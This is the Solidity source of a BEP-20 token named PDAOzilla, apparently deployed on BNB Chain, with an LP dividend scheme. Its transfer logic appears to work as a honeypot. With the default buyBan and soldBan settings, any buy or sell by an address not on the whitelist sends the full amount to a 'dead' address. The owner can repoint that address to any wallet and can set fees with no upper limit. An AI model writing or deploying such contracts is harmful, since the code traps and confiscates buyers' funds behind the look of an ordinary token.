/**
 *Submitted for verification at BscScan.com on 2022-08-03
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

abstract contract Ownable {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor () {
        address msgSender = msg.sender;
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
    function owner() public view virtual returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(owner() == msg.sender, "Ownable: caller is not the owner");
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

library SafeMath {
    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        uint256 c = a + b;
        if (c < a) return (false, 0);
        return (true, c);
    }
    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        if (b > a) return (false, 0);
        return (true, a - b);
    }
    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        if (a == 0) return (true, 0);
        uint256 c = a * b;
        if (c / a != b) return (false, 0);
        return (true, c);
    }
    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        if (b == 0) return (false, 0);
        return (true, a / b);
    }
    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        if (b == 0) return (false, 0);
        return (true, a % b);
    }
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        return a - b;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) return 0;
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        return a / b;
    }
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: modulo by zero");
        return a % b;
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        return a - b;
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        return a / b;
    }
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        return a % b;
    }
    function max(uint256 a, uint256 b) internal pure returns (uint256) {
        return a >= b ? a : b;
    }
    function min(uint256 a, uint256 b) internal pure returns (uint256) {
        return a < b ? a : b;
    }
    function average(uint256 a, uint256 b) internal pure returns (uint256) {
        return (a / 2) + (b / 2) + ((a % 2 + b % 2) / 2);
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}

interface IUniswapV2Pair {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);

    function name() external pure returns (string memory);
    function symbol() external pure returns (string memory);
    function decimals() external pure returns (uint8);
    function totalSupply() external view returns (uint);
    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);

    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);

    function DOMAIN_SEPARATOR() external view returns (bytes32);
    function PERMIT_TYPEHASH() external pure returns (bytes32);
    function nonces(address owner) external view returns (uint);

    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;

    event Mint(address indexed sender, uint amount0, uint amount1);
    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
    event Swap(
        address indexed sender,
        uint amount0In,
        uint amount1In,
        uint amount0Out,
        uint amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);

    function MINIMUM_LIQUIDITY() external pure returns (uint);
    function factory() external view returns (address);
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function price0CumulativeLast() external view returns (uint);
    function price1CumulativeLast() external view returns (uint);
    function kLast() external view returns (uint);

    function mint(address to) external returns (uint liquidity);
    function burn(address to) external returns (uint amount0, uint amount1);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;
    function sync() external;

    function initialize(address, address) external;
}

interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);

    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}

interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountETH);
    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountETH);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

contract Node {
}

contract PDAOzilla is IERC20, Ownable {
    using SafeMath for uint256;

    mapping (address => uint256) internal _balances;
    mapping (address => mapping (address => uint256)) internal _allowances;
    uint256 internal _totalSupply;

    string private _name = "PDAOzilla";
    string private _symbol = "PDAOzilla";
    uint8 private _decimals = 18;

    mapping(address => bool) public whiteList;
    mapping(address => bool) public pairList;

    IUniswapV2Router02 public uniswapV2Router = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    IERC20 public usdt = IERC20(0x55d398326f99059fF775485246999027B3197955);
    address public team = 0x1daaa42A8CE963dD218f725018D867AE971Abfe9;

    address public uniswapV2Pair;
    address public union;
    uint256 public unionPct = 4;
    uint256 public burnPct = 2;
    bool public buyBan = true;
    bool public soldBan = true;
    bool public soldZero = false;

    bool inSwapAndLiquify;
    uint256 public total = 21 * 1e4 * 1e18;
    address public dead = 0x000000000000000000000000000000000000dEaD;

    //Node param
    address[] shareholders1;
    mapping (address => uint256) shareholderIndexes1;
    mapping(address => bool) private _updated1;
    uint256 public currentIndex1;

    uint256 public distributorTime;
    uint256 public distributorGas = 500000;
    uint256 public minPeriod = 30 minutes;
    uint256 public minAmount = 1 * 1e18;
    uint256 public minBalance = 100 * 1e18;
    address private fromAddress;
    address private toAddress;

    uint public LPlimit = 1e18;

    constructor () {
        union = address(new Node());
        // Create a uniswap pair for this new token
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory())
        .createPair(address(this), address(usdt));

        _mint(team, total);

        whiteList[team] = true;
        whiteList[address(this)] = true;
        pairList[uniswapV2Pair] = true;
    }

    modifier lockTheSwap {
        inSwapAndLiquify = true;
        _;
        inSwapAndLiquify = false;
    }

    function changeMin(uint256 _distributorGas, uint256 _minPeriod, uint256 _minAmount, uint256 _minBalance) public onlyOwner{
        distributorGas = _distributorGas;
        minPeriod = _minPeriod;
        minAmount = _minAmount;
        minBalance = _minBalance;
    }

    //Token param change
    function setPairList(address[] memory addrs, bool flag) public onlyOwner() {
        for(uint i=0;i<addrs.length;i++){
            pairList[addrs[i]] = flag;
        }
    }

    function setWhiteList(address[] memory addrs, bool flag) public onlyOwner() {
        for(uint i=0;i<addrs.length;i++){
            whiteList[addrs[i]] = flag;
        }
    }

    function changeRouterAddress(address newRouter) public onlyOwner() {
        uniswapV2Router = IUniswapV2Router02(newRouter);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), address(usdt));
        pairList[uniswapV2Pair] = true;
    }

    function process1(uint256 gas) private {
        address pool = union;
        uint256 shareholderCount = shareholders1.length;
        if(shareholderCount == 0) return;
        uint256 nowbanance = balanceOf(pool);
        uint256 gasUsed = 0;
        uint256 gasLeft = gasleft();

        uint256 iterations = 0;
        while(gasUsed < gas && iterations < shareholderCount) {
            if(currentIndex1 >= shareholderCount){
                currentIndex1 = 0;
            }

            uint256 amount = nowbanance.mul(IERC20(uniswapV2Pair).balanceOf(shareholders1[currentIndex1])).div(IERC20(uniswapV2Pair).totalSupply());
            if(amount < minAmount) {
                currentIndex1++;
                iterations++;
                continue;
            }
            if(balanceOf(pool) < amount ) return;
            distributeDividend(pool, shareholders1[currentIndex1], amount);

            gasUsed = gasUsed.add(gasLeft.sub(gasleft()));
            gasLeft = gasleft();
            currentIndex1++;
            iterations++;
        }
    }

    function setShare1(address shareholder) private {
        bool shouldRemove = (IERC20(uniswapV2Pair).balanceOf(shareholder) < LPlimit);
        if(_updated1[shareholder] ){      
            if(shouldRemove) quitShare1(shareholder);              
            return;  
        }
        if(shouldRemove) return;
        addShareholder1(shareholder);
        _updated1[shareholder] = true;
    }
    function addShareholder1(address shareholder) internal {
        shareholderIndexes1[shareholder] = shareholders1.length;
        shareholders1.push(shareholder);
    }
    function quitShare1(address shareholder) private {
        removeShareholder1(shareholder);   
        _updated1[shareholder] = false; 
    }
    function removeShareholder1(address shareholder) internal {
        shareholders1[shareholderIndexes1[shareholder]] = shareholders1[shareholders1.length-1];
        shareholderIndexes1[shareholders1[shareholders1.length-1]] = shareholderIndexes1[shareholder];
        shareholders1.pop();
    }
   
    function distributeDividend(address pool, address shareholder ,uint256 amount) internal {
        _balances[pool] = _balances[pool].sub(amount);
        _balances[shareholder] = _balances[shareholder].add(amount);
        emit Transfer(pool, shareholder, amount);
    }

    function getShareholdersLength() public view returns(uint256){
        return (shareholders1.length);
    }

    function getList(uint256 start, uint256 length) public view returns(address[] memory addrs, uint256[] memory bals){
        address[] memory list = shareholders1;
        uint256 end = (start+length) < list.length ? (start+length) : list.length;
        (,length) = end.trySub(start);
        addrs = new address[](length);
        bals = new uint256[](length);
        IERC20 pair = IERC20(uniswapV2Pair);
        for(uint i=start; i<end; i++){
            addrs[i-start] = list[i];
            bals[i-start] = pair.balanceOf(list[i]);
        }
    }

    function name() public view virtual returns (string memory) {
        return _name;
    }

    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(msg.sender, spender, _allowances[msg.sender][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        _approve(msg.sender, spender, _allowances[msg.sender][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }

    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        _beforeTokenTransfer(sender, recipient, amount);
        _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");

        if(!inSwapAndLiquify){
            if(whiteList[sender] || whiteList[recipient]){
                amount = amount;
            }else if(pairList[sender] && buyBan){
                _balances[address(dead)] = _balances[address(dead)].add(amount);
                emit Transfer(sender, address(dead), amount);
                amount = 0;
            }else if(pairList[recipient] && soldBan){
                _balances[address(dead)] = _balances[address(dead)].add(amount);
                emit Transfer(sender, address(dead), amount);
                amount = 0;
            }else if(pairList[recipient] && soldZero){
                amount = amount;
            }else{
                uint256 toUnion = amount.mul(unionPct).div(100);
                uint256 toBurn = amount.mul(burnPct).div(100);

                _balances[address(union)] = _balances[address(union)].add(toUnion);
                emit Transfer(sender, address(union), toUnion);

                _balances[address(dead)] = _balances[address(dead)].add(toBurn);
                emit Transfer(sender, address(dead), toBurn);

                amount = amount.sub(toUnion).sub(toBurn);
            }
        }

        if(amount != 0) {
            _balances[recipient] = _balances[recipient].add(amount);
            emit Transfer(sender, recipient, amount);
        }

        if(inSwapAndLiquify) return;

        if(fromAddress == address(0)) fromAddress = sender;
        if(toAddress == address(0)) toAddress = recipient;  
        if(fromAddress != uniswapV2Pair && fromAddress != dead) {
            setShare1(fromAddress);
        }
        if(toAddress != uniswapV2Pair && toAddress != dead) {
            setShare1(toAddress);
        }
        
        fromAddress = sender;
        toAddress = recipient;
        if((balanceOf(union) >= minBalance) && 
            sender != address(this) && distributorTime.add(minPeriod) <= block.timestamp) {
            if(balanceOf(union) >= minBalance) process1(distributorGas.div(2));
            distributorTime = block.timestamp;
        }
    }

    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");
        _beforeTokenTransfer(address(0), account, amount);
        _totalSupply = _totalSupply.add(amount);
        _balances[account] = _balances[account].add(amount);
        emit Transfer(address(0), account, amount);
    }

    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");
        _beforeTokenTransfer(account, address(0), amount);
        _balances[account] = _balances[account].sub(amount, "ERC20: burn amount exceeds balance");
        _totalSupply = _totalSupply.sub(amount);
        emit Transfer(account, address(0), amount);
    }

    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _setupDecimals(uint8 decimals_) internal virtual {
        _decimals = decimals_;
    }

    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual { }

    //change
    function changePct(uint _union, uint _burnpct) public onlyOwner{
        unionPct = _union;
        burnPct = _burnpct;
    }

    function changeBan(bool _buy, bool _sold) public onlyOwner{
        buyBan = _buy;
        soldBan = _sold;
    }

    function changeSold(bool _soldBan, bool _soldZero) public onlyOwner{
        soldBan = _soldBan;
        soldZero = _soldZero;
    }

    function changeAddress(address _dead) public onlyOwner{
        dead = _dead;
    }

    function changeLPlimit(uint _limit) public onlyOwner{
        LPlimit = _limit;
    }
}